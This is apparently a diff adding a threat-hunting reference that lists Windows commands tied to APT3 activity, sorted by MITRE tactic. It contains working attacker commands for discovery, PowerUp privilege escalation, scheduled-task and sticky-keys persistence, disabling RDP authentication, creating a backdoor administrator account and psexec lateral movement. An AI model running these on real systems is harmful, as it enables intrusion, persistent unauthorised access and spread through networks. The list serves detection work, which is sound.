@@ -1,0 +1,51 @@
+Suspicious Windows Commands That Everyone Should Check Them. They Are Sorted By MITRE Tactics (APT3 Sample)
+Discovery:
+1. ver
+2. set
+3. whoami [/all]
+4. net config [workstation/server]
+5. ipconfig [/all]
+6. systeminfo
+7. reg edit / reg query ...
+8. arp -a
+9. route print
+10. netstat -ano[b]
+11. tasklist /v
+12. net start
+13. qprocess *
+14. net localgroup "<Group Name>"
+15. net group "Domain Computer"/domain[:Domain]
+16. net user /ahangari
+17. net use [\\ip\path] [password] [/user:DOMAIN\user]
+18. net share
+19. net view \\host /all
+20. schtasks 
+21. dsquery ....
+
+Priviledge Escalation:
+1. powershell.exe -epbypass PowerUp.ps1 Invoke-AllChecks
+
+Persistence:
+- Creating a scheduled task:
+1. schtasks [/S HOSTNAME] /create /tn ""acachesrv"" /tr C:\file\path\here.exe /sc ONLOGON /ru ""System"" [/rp password]
+- Requirements for running scheduled tasks:
+2. net start schedule
+3. sc config schedule start= auto
+- Sticky Keys Persistence via Registry Manipulations:
+5. REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f
+- Sticky Keys Persistence via binary swapping:
+6. takeown.exe C:\Windows\system32\sethc.exe
+7. del C:\Windows\system32\sethc.exe
+8. copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
+- Enable RDP Services:
+9. REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
+10. reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+11. net start TermService
+- Add backdoor user account:
+12. net user support_388945a0 somepasswordhere /add /y
+13. net localgroup administrators support_388945a0 /add
+14. net localgroup ""remote desktop users"" support_388945a0 /add"
+
+Lateral Movement And Execution:
+1. psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)
+3. psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)
